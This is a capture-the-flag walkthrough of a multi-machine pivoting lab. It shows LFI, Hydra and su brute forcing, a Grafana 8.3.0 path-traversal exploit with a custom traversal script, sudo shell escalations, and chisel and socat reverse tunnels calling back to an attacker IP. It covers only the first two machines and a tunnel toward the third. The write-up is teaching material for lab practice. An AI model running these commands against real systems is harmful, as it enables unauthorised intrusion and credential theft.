![Screenshot](/hard/BigPivoting/Images/machine.png)

Difficulty: **Hard**

Made by: **El pinguino de mario**

---
# Steps to pwn 🥽

* 👁️  [Pre-Reconnaissance](#pre-reconnaissance)

## Machine Inclusion 🔒

* 👁️  [Reconnaissance Inclusion](#reconnaissance-inclusion)
* 🔍 [Enumeration Inclusion](#enumeration-inclusion)
* 🪓 [Exploitation Inclusion](#exploitation-inclusion)
* 🚩 [Privilege Escalation Inclusion](#privilege-escalation-inclusion)
* 🔌 [Making Tunnel Inclusion -> Move](#making-tunnel-from-inclusion-to-move)

## Machine Move 🗃️

* 👁️  [Reconnaissance Move](#reconnaissance-move)
* 🔍 [Enumeration Move](#enumeration-move)
* 🪓 [Exploitation Move](#exploitation-move)
* 🚩 [Privilege Escalation Move](#privilege-escalation-move)
* 🔌 [Making Tunnel Move -> Trust](#making-tunnel-from-move-to-trust)

## Machine Trust 👤

* 👁️  [Reconnaissance Trust](#reconnaissance-trust)
* 🪓 [Exploitation Trust](#exploitation-trust)
* 🔍 [Enumeration Trust](#enumeration-trust)
* 🚩 [Privilege Escalation Trust](#privilege-escalation-trust)
* 🔌 [Making Tunnel Trust -> Upload](#making-tunnel-from-trust-to-upload)

## Machine Upload ⬇️

* 👁️  [Reconnaissance Upload](#reconnaissance-upload)
* 🔍 [Enumeration Upload](#enumeration-upload)
* 🪓 [Exploitation Upload](#exploitation-upload)
* 🚩 [Privilege Escalation Upload](#privilege-escalation-upload)
* 🔌 [Making Tunnel Upload -> WhereIsMywebshell](#making-tunnel-from-upload-to-whereismywebshell)

## Machine WhereIsMywebshell 💻

* 👁️  [Reconnaissance WhereIsMywebshell](#reconnaissance-whereismywebshell)
* 🔍 [Enumeration WhereIsMywebshell](#enumeration-whereismywebshell)
* 🪓 [Exploitation WhereIsMywebshell](#exploitation-whereismywebshell)
* 🚩 [Privilege Escalation WhereIsMywebsgell](#privilege-escalation-whereismywebshell)

---

Now we can start our **pre reconnaissance** phase.

---
# Pre Reconnaissance

First of all this machine have 5 targets to pivot on, so im going to make a diagram to show how it looks all of this.

![Screenshot](/hard/BigPivoting/Images/image1.png)

As we can see there is multiple networks and machines, our mission is to **Compromise** every machine and jump to the next machine and finally reaching to the last machine **WhereIsMywebshell**, So we need a lot the use of **chisel** to redirect a traffic something like a tunnel, and have access to all of these machines to us, using **proxychains** and also **socat**.

And also we need to enumerate a lot each one of this machines, and making our own python script to enumerate, because **ffuf** and **gobuster** doesn't work quite well on enumerating with a lot of tunnels and the use of proxychains.

So now we can start our first reconnaissance for the first machine **Inclusion**.

---
# Reconnaissance Inclusion

First of all we make sure the first machine is up, we can do this with the command **ping**.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/inclusion]
└─$ ping 10.10.10.2
PING 10.10.10.2 (10.10.10.2) 56(84) bytes of data.
64 bytes from 10.10.10.2: icmp_seq=1 ttl=64 time=0.200 ms
64 bytes from 10.10.10.2: icmp_seq=2 ttl=64 time=0.097 ms
64 bytes from 10.10.10.2: icmp_seq=3 ttl=64 time=0.109 ms
^C
--- 10.10.10.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2045ms
rtt min/avg/max/mdev = 0.097/0.135/0.200/0.045 ms
```

Okay so we can start with **nmap** to find what ports are open in the 1st machine.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/inclusion]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 10.10.10.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-14 22:59 -05
Initiating ARP Ping Scan at 22:59
Scanning 10.10.10.2 [1 port]
Completed ARP Ping Scan at 22:59, 0.13s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:59
Scanning 10.10.10.2 [65535 ports]
Discovered open port 80/tcp on 10.10.10.2
Discovered open port 22/tcp on 10.10.10.2
Completed SYN Stealth Scan at 22:59, 4.97s elapsed (65535 total ports)
Nmap scan report for 10.10.10.2
Host is up, received arp-response (0.000043s latency).
Scanned at 2025-12-14 22:59:20 -05 for 5s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:0A:0A:0A:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 5.35 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

After the scan concludes we can see that are 2 ports open:

- port 22 (ssh / secure shell)
- port 80 (http / Hyper-Text Transfer Protocol)

But also we want to know more about these 2 ports, so we can use nmap again to see what services are running and his versions.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/inclusion]
└─$ nmap -p22,80 -sCV 10.10.10.2 -oX target --stats-every=1m
```

**-p22,80** <- With this argument nmap will only scan this 2 ports that we discover.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

**-oX target** <- With this argument we save all the output that nmap give us and save it as a xml file.

**--stats-every=1m** <- With this argument we receive stats of the scan every 1 minute, this can have minutes (m) and seconds (s)

After the scan finish we got the output in a xml file, we do this to make a html page to see the information more easily and pretty to look at.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/inclusion]
└─$ xsltproc target -o target.html
```

With this command we convert the xml file to a html file, now let's open it.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/inclusion]
└─$ open target.html 
```

And we can see this in our browser.

![Screenshot](/hard/BigPivoting/Images/image2.png)

As we can see it's more readable and pretty.

And with the port 80 it seems a website, we can use **whatweb** to find what technologies uses this website.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/inclusion]
└─$ whatweb http://10.10.10.2
http://10.10.10.2 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[10.10.10.2], Title[Apache2 Debian Default Page: It works]
```

It seems a default page, we can take a look with our browser.

![Screenshot](/hard/BigPivoting/Images/image3.png)

As usual nothing interesting here, even if we take a look into the source code.

So we need to do a little bit of **enumeration** to this machine, we can do this with **gobuster**.

---
# Enumeration Inclusion

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/inclusion]
└─$ gobuster dir -u http://10.10.10.2 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/shop                 (Status: 301) [Size: 307] [--> http://10.10.10.2/shop/]
```

**-x** <- this is useful to try to find files with extensions in this case using php, and html.

As we can see there is 2 results, the index page and another directory or page of the website, **shop** let's take a look with our browser.

![Screenshot](/hard/BigPivoting/Images/image4.png)

We can see here something interesting, it seems exists an argument or parameter to see a possible file (**archivo**) so we can try to look into the **passwd** file.

![Screenshot](/hard/BigPivoting/Images/image5.png)

So we got a **LFI** here, but after a long time of enumeration and trying to find another possible files or miss configurations to escalate this to a RCE, we can find that the passwd file exists these 2 users, **seller** and **manchi**, we can try to do some brute force with hydra to ssh to login as any of this users.

But first we make a file to make hydra to try to login with these 2 users.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/inclusion]
└─$ cat users 
manchi
seller
```

So then we can start our brute force with hydra.

---
# Explotation Inclusion

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/inclusion]
└─$ hydra -t 16 -L users -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.2
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-14 23:27:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://10.10.10.2:22/
[22][ssh] host: 10.10.10.2   login: manchi   password: lovely
```

So we got the credentials of the user as the user **manchi**.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/inclusion]
└─$ ssh manchi@10.10.10.2
The authenticity of host '10.10.10.2 (10.10.10.2)' can't be established.
ED25519 key fingerprint is: SHA256:7l7ozEpa6qePwn/o8bYoxlwtLa2knvlaSKIk1mkRMfU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.2' (ED25519) to the list of known hosts.
manchi@10.10.10.2's password: 
Linux a503d483a6ef 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr 14 16:47:47 2024 from 172.17.0.1
manchi@a503d483a6ef:~$
```

Great so we are in.

---
# Privilege Escalation Inclusion

After a looooong enumeration to try escalate privileges I can only think to also do brute force to the other user **seller**.

I personally use **suForce** there is a lot of more tools but for me the vast majority of them doesn't work for me quite well or they are made with python, but sometimes the machines don't have python installed in it, and they need to install libraries probably in a real pentest can be useful but this machines doesn't have connection to the internet.

Okay enough talk.

So first we transfer the script and the dictionary to brute force the other user **seller**.

We can do this with **scp** taking advantage that we have the password of the user **manchi**.

```
┌──(craft㉿kali)-[~/hacks/suForce]
└─$ scp suForce /usr/share/wordlists/rockyou.txt manchi@10.10.10.2:/tmp
manchi@10.10.10.2's password: 
suForce                                                                                                                                                                                                   100% 2430     3.0MB/s   00:00    
rockyou.txt 
```

So we are going to put this files into the **/tmp** directory.

```
manchi@a503d483a6ef:/tmp$ ls
rockyou.txt  suForce
```

So we can start our brute force attack.

```
manchi@a503d483a6ef:/tmp$ bash suForce -u seller -w rockyou.txt 
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | seller
📖 Wordlist | rockyou.txt
🔎 Status   | 20/14344392/0%/qwerty
💥 Password | qwerty
───────────────────────────────────
```

So we got the password of the user **seller**.

```
manchi@a503d483a6ef:/tmp$ su seller
Password: 
seller@a503d483a6ef:/tmp$ whoami
seller
```

And when doing **sudo -l** we find that we have a **SUDOER** privilege.

```
seller@a503d483a6ef:/tmp$ sudo -l
Matching Defaults entries for seller on a503d483a6ef:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User seller may run the following commands on a503d483a6ef:
    (ALL) NOPASSWD: /usr/bin/php
```

So **any** user can execute **php** even as the user root.

```
seller@a503d483a6ef:/tmp$ sudo php -r 'system("bash");'
```

When we execute this command we are calling system to get a shell as the user **root**.

```
seller@a503d483a6ef:/tmp$ sudo php -r 'system("bash");'
root@a503d483a6ef:/tmp# whoami
root
```

Okay so we pwned the 1st machine **Inclusion**.

---
# Making tunnel from Inclusion to Move

Okay so now we can see that we have another interface of network on this system.

```
root@a503d483a6ef:~# hostname -i
10.10.10.2 20.20.20.2
```

We can find that exists another machine that we can access into. But in real world scenarios we couldn't know it very well.

So i'm making our own bash script to know what it's the ip address of the other machine.

```
root@a503d483a6ef:~# which ping
/usr/bin/ping
```

In this system we can find that exists the command **ping** and will be a great help.

```bash
#!/bin/bash

for num in {1..254}; do
        ping -c 1 20.20.20.$num &>/dev/null && echo "[+] The host 20.20.20.$num is ACTIVE" &
done
```

I made this bash script to make a ping to each address of the ip 20.20.20.? and try to find if we receive the response, the script are going to print the IP address that have a response, and we are using the final **&** in summary is going to make the scan more fast.

So let's execute our bash script and find what hosts are active.

```
root@a503d483a6ef:~# bash scan.sh 
[+] The host 20.20.20.3 is ACTIVE
[+] The host 20.20.20.2 is ACTIVE
```

So finally we can found the another machine's IP address 20.20.20.3.

So we can make our mini scanner to find what ports are open to the other machine, of course this are not going to be so good as **nmap**.

```bash
#!/bin/bash

for num in {1..10000}; do
        echo "" 2>/dev/null > /dev/tcp/20.20.20.3/$num && echo "[+] The port $num is OPEN" &
done
```

Here we are try to made a connection with TCP to each possible port starting to the port 1, to the port 10,000 so when we receive a successful code/connection we are going to print the port that is OPEN from the other machine.

So let's execute our scanner.

```
root@a503d483a6ef:~# bash scan.sh 
[+] The port 21 is OPEN
[+] The port 22 is OPEN
[+] The port 80 is OPEN
[+] The port 3000 is OPEN
```

It seems that are 4 ports open:

- port 21 (ftp / File Transfer Protocol)
- port 22 (ssh / secure shell)
- port 80 (http / Hyper-Text Transfer Protocol)
- port 3000 (???)

It seems great but we need to view the website and more in our attack machine, how can we do it?

We can use **chisel** to receive and send traffic to the 1st machine Inclusion.

Then let's transfer **chisel** to the 1st machine with **scp**.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/inclusion]
└─$ scp /usr/bin/chisel manchi@10.10.10.2:/tmp
manchi@10.10.10.2's password: 
chisel
```

Okay so with our attack machine let's make a server to receive connections from others.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/inclusion]
└─$ chisel server --reverse -p 1234
2025/12/15 01:05:44 server: Reverse tunnelling enabled
2025/12/15 01:05:44 server: Fingerprint b6aMLPgDWyikavQWtgclegyB4N5S/p9SpTZN2zG0IDU=
2025/12/15 01:05:44 server: Listening on http://0.0.0.0:1234
```

We are listening any connection with the port 1234.

So then with the other machine with **chisel** we are going to connect to our attack machine.

```
root@a503d483a6ef:/tmp# ./chisel client 192.168.0.20:1234 R:socks &
2025/12/15 06:08:57 client: Connecting to ws://192.168.0.20:1234
2025/12/15 06:08:57 client: Connected (Latency 777.728µs)
```

Okay so we are sending the traffic through socks to us.

And in our server we can see this.

```
2025/12/15 01:08:57 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

We successfully create the tunnel with socks, allowing us to access the internal network of the 1st machine inclusion.

Why we do this? Because we want to access to the internal network of the machine, and be capable to use our tools, like nmap, take a look in the website of the other machine and so on.

But before using nmap and all of this things, we make sure that the **proxychains4.conf** file have this content:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil/bigpivoting]
└─$ cat /etc/proxychains4.conf | grep -E "socks5 127.0.0.1|dynamic_chain"
dynamic_chain
socks5 127.0.0.1 1080
```

We uncomment the **dynamic chain** and we add the final line to the conf file.

---
# Reconnaissance Move

So now we can try to now scan with nmap to the other machine.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil/bigpivoting]
└─$ sudo proxychains -q nmap --top-ports 1000 -sT -Pn -n 20.20.20.3 -vv --min-rate 5000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 16:02 -05
Initiating Connect Scan at 16:02
Scanning 20.20.20.3 [1000 ports]
Discovered open port 21/tcp on 20.20.20.3
Discovered open port 80/tcp on 20.20.20.3
Discovered open port 22/tcp on 20.20.20.3
Discovered open port 3000/tcp on 20.20.20.3
Completed Connect Scan at 16:02, 1.94s elapsed (1000 total ports)
Nmap scan report for 20.20.20.3
Host is up, received user-set (0.0013s latency).
Scanned at 2025-12-15 16:02:34 -05 for 2s
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE REASON
21/tcp   open  ftp     syn-ack
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3000/tcp open  ppp     syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
```


We see make the nmap scan, by each scan we do with nmap always we need to insert these 2 arguments to make successful the scan:

- **-sT** -> This make that nmap complete the three-way handshake when we are pivoting to a network, we try to use this TCP scan and evading the SYN scan because if we don't nmap will ignore the proxy. (for more information you can take a look [here](https://security.stackexchange.com/questions/120708/nmap-through-proxy/120723#120723))

- **-Pn** -> This treat any host as active, this is useful because nmap can't know if the host is active and assumes that the host is down.

- **--top-ports** -> This makes that nmap scan the most common ports in this case we are using the most common 1,000 ports, because nmap when scanning with a proxy sometimes is very slow when scanning all the ports.


When the scan concludes we can see that 4 ports open that we discover before in our mini scanner.

So we make another nmap scan to know more about these ports.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/move]
└─$ sudo proxychains -q nmap -p21,22,80,3000 -sT -Pn -n -sCV 20.20.20.3 -oX target --stats-every=1m
```

So we convert once again the XML file to HTML file to make more readable and pretty the output.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/move]
└─$ xsltproc target -o target.html
```

And then let's open the html file.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/move]
└─$ open target.html
```

![Screenshot](/hard/BigPivoting/Images/image6.png)

Okay we can see here that we can login as **anonymous** in the port 21 (ftp)

We can try to login what are inside of this port.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/move]
└─$ sudo proxychains -q ftp 20.20.20.3 -a
Connected to 20.20.20.3.
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

We are in, let's see what are his contents.

```
ftp> ls
229 Entering Extended Passive Mode (|||9768|)
150 Here comes the directory listing.
drwxrwxrwx    1 0        0            4096 Mar 29  2024 mantenimiento
```

it seems a directory.

```
ftp> cd mantenimiento
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||64506|)
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0            2021 Mar 29  2024 database.kdbx
```

We got a **keepass** file, this can have credentials, so let's download it.

```
ftp> get database.kdbx
local: database.kdbx remote: database.kdbx
229 Entering Extended Passive Mode (|||20828|)
150 Opening BINARY mode data connection for database.kdbx (2021 bytes).
100% |***********************************************************************************************************************************************************************************************|  2021        0.49 KiB/s    00:00 ETA^C
receive aborted. Waiting for remote to finish abort.
226 Transfer complete.
500 Unknown command.
2021 bytes received in 00:04 (0.45 KiB/s)
```

We can take a look with **keepass2** to open it.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/move]
└─$ keepass2 database.kdbx
```

![Screenshot](/hard/BigPivoting/Images/image7.png)

We need a password, we can try to capture the hash of this with **keepass2john** but it won't work because the hash have some salting, and with **hashcat** is the same, it detects salting in the hash.

Then we need to make some enumeration to this machine.

---
# Enumeration Move

If we remember, it exists 2 websites in the port 80 and the port 3000.

First let's analyse the first one.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/move]
└─$ sudo proxychains -q whatweb http://20.20.20.3
http://20.20.20.3 [200 OK] Apache[2.4.58], Country[UNITED STATES][US], HTTPServer[Debian Linux][Apache/2.4.58 (Debian)], IP[20.20.20.3], Title[Apache2 Debian Default Page: It works]
```

It seems another default page, let's take a look into with our browser.

But before doing that, I use **foxyproxy** a extension from my browser to try to view the website, let's configure it to be able to access into the website.

![Screenshot](/hard/BigPivoting/Images/image8.png)

So let's save it, selecting the type that is SOCKS5, hostname our machine (127.0.0.1) and the port (1080)

Then we select the proxy with **foxyproxy**.

![Screenshot](/hard/BigPivoting/Images/image9.png)

And we can see this, nothing interesting, not even in the source code too.

Then let's see the another website.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/move]
└─$ sudo proxychains -q whatweb http://20.20.20.3:3000 
http://20.20.20.3:3000 [302 Found] Cookies[redirect_to], Country[UNITED STATES][US], HttpOnly[redirect_to], IP[20.20.20.3], RedirectLocation[/login], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-XSS-Protection[1; mode=block]
http://20.20.20.3:3000/login [200 OK] Country[UNITED STATES][US], Grafana[8.3.0], HTML5, IP[20.20.20.3], Script, Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
```

We find that uses **grafana** in particular the version **8.3.0** this is vulnerable to a LFI.

---
# Exploitation move

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/move]
└─$ searchsploit grafana 8.3.0 
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read | multiple/webapps/50581.py
Shellcodes: No Results
```

So we can try to copy the script and let's see if it works.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/move]
└─$ sudo proxychains -q python3 exploit.py -H http://20.20.20.3:3000
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
ftp:x:101:104:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
grafana:x:103:105::/usr/share/grafana:/bin/false
freddy:x:1000:1000::/home/freddy:/bin/bash
```

And it seems that works.

But with doing all of this I try to enumerate possible sensitive files in the system, but is basically losing time here, so I can try to enumerate the normal http website (port 80) with **gobuster** or **ffuf**.

But this tools doesn't work quite well when using proxychains and all of this, is very slow, so we need to make our own python script to enumerate resources from the website.

So here is the script:

```python
from pwn import *
import requests

dictionary = "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt"
session = requests.Session()

def send_request(payload):
        target = f"http://20.20.20.3:3000/public/plugins/text/../../../../../../../../../var/www/html/{payload}"

        req = requests.Request(method='GET', url=target)
        prep = req.prepare()
        prep.url = target
        response = session.send(prep, verify=False, timeout=3)

        if response.status_code == 200:
                log.info(f'The file "{payload}" exists.')

with log.progress("Getting content...") as bar:
        with open(dictionary) as file:
                for line in file:

                        if "#" in line or not line: continue
                        convert = str(line).strip()

                        php = convert + ".php"
                        html = convert + ".html"

                        send_request(php)
                        bar.status(f"Trying with {php}...")
                        send_request(html)
                        bar.status(f"Trying with {html}...")
                        send_request(convert)
                        bar.status(f"Trying with {convert}...")
```

So im making use of the exploit to try find contents inside of the **/var/www/html** where normally it contains contents of the website, even credentials.

Then let's execute our script.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/move]
└─$ sudo proxychains -q python3 enumeration.py
[+] Getting content...: Success
[*] The file "index.html" exists.
[*] The file "maintenance.html" exists.
```

And can we find the page **maintenance** so let's take a look into our browser.

![Screenshot](/hard/BigPivoting/Images/image10.png)

It seems another file that exists in the **/tmp/** directory let's see his content with the exploit of **grafana**.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/move]
└─$ sudo proxychains -q python3 exploit.py -H http://20.20.20.3:3000
Read file > /tmp/pass.txt
t9sH76gpQ82UFeZ3GXZS
```

So it seems a password for a user, if we remember that in the passwd file exists a user **freddy**.

let's try to login through **ssh** with this user and password.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/move]
└─$ sudo proxychains -q ssh freddy@20.20.20.3
The authenticity of host '20.20.20.3 (20.20.20.3)' can't be established.
ED25519 key fingerprint is: SHA256:vI77ttzFmsp8NiCsxBpeZipRCZ9MdfkeMJojz7qMiTw
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '20.20.20.3' (ED25519) to the list of known hosts.
freddy@20.20.20.3's password: 
Linux 4009973a2306 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Dec 16 04:48:22 2025 from 20.20.20.2
┏━(Message from Kali developers)
┃
┃ This is a minimal installation of Kali Linux, you likely
┃ want to install supplementary tools. Learn how:
┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
┃
┗━(Run: “touch ~/.hushlogin” to hide this message)
┌──(freddy㉿4009973a2306)-[~]
└─$
```

We login as **freddy** in the **Move** machine!

---
# Privilege Escalation Move

When we do **sudo -l** we have a privilege of **SUDOER**

```
┌──(freddy㉿4009973a2306)-[~]
└─$ sudo -l
Matching Defaults entries for freddy on 4009973a2306:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User freddy may run the following commands on 4009973a2306:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
```

It seems we can execute this python script as **any** user even the user **root**.

Then let's take a look if we can read or modify this python script.

```
┌──(freddy㉿4009973a2306)-[/opt]
└─$ ls -l maintenance.py 
-rw-r--r-- 1 freddy freddy 35 Mar 29  2024 maintenance.py
```

And we are proprietary of this python script! we can read and modify the content.

```python
┌──(freddy㉿4009973a2306)-[/opt]
└─$ cat maintenance.py 
import os

os.system("bash")
```

Let's change the content using the library os, to execute a shell as the user root!

```
┌──(freddy㉿4009973a2306)-[/opt]
└─$ sudo python3 /opt/maintenance.py 
┌──(root㉿4009973a2306)-[/opt]
└─# whoami
root
```

So we are root now! **pwned**!

---

# Making tunnel from Move to Trust

If we take a look into the interfaces of network we can see this:

```
┌──(root㉿4009973a2306)-[/opt]
└─# hostname -i
20.20.20.3 30.30.30.2
```

We can use our own mini scanner that we did before.

But in this case this system doesn't have the command **ping** to find other hosts.

So I change to something like this:

```bash
#!/bin/bash

for num in {1..254}; do
        echo "" 2>/dev/null > /dev/tcp/30.30.30.$num/22 && echo "[+] The host 30.30.30.$num is ACTIVE" &
done
```

So we are assuming that the port 22 is open to the machine we are trying to reach.

```
┌──(root㉿93327e482a4b)-[~]
└─# bash scan.sh 
[+] The host 30.30.30.2 is ACTIVE
[+] The host 30.30.30.3 is ACTIVE
```

and we find the other machine's IP address. We can use again our mini scanner to try to find what ports are open in the other machine.

```
┌──(root㉿93327e482a4b)-[~]
└─# bash scan.sh 
[+] The port 22 is OPEN
[+] The port 80 is OPEN
```

2 ports open, so let's make another tunnel to reach to the machine **Trust**.

But before doing this we need to use **socat** on the machine **Inclusion** to redirect the traffic to us, is quite hard to describe, so first we need to transfer **socat** to Inclusion, more specifically a static binary or we are going to have some issues with the system.

I download it from [here](https://github.com/aledbf/socat-static-binary/releases/tag/v0.0.1)

And once we do this, we give them permissions of **execution** and let's transfer with **scp**.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/Trust]
└─$ scp socat manchi@10.10.10.2:/tmp
manchi@10.10.10.2's password: 
socat
```

Then we execute the following command in Inclusion:

```
root@525db093c118:/tmp# ./socat TCP-LISTEN:1111,fork tcp:192.168.0.20:1234 &
```

So the machine **Inclusion** are going to be in listen mode on the port **1111** and if receive traffic, we are going to send it back to our attack machine, our server of **chisel**.

Okay so with the machine **Move** now we can transfer chisel to it.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/Trust]
└─$ sudo proxychains -q scp /usr/bin/chisel freddy@20.20.20.3:/tmp 
freddy@20.20.20.3's password: 
chisel
```

So we are going to make the connection with **chisel** from the machine **Move** to **Inclusion**, and the machine **Inclusion** are going to redirect the traffic to us.

```
┌──(root㉿93327e482a4b)-[/tmp]
└─# ./chisel client 20.20.20.2:1111 R:1111:socks &
2025/12/16 17:09:17 client: Connecting to ws://20.20.20.2:1111
2025/12/16 17:09:17 client: Connected (Latency 746.351µs)
```

And in our chisel server we receive this:

```
2025/12/16 12:09:17 server: session#2: tun: proxy#R:127.0.0.1:1111=>socks: Listening
```

We get the connection from the machine **Move!**

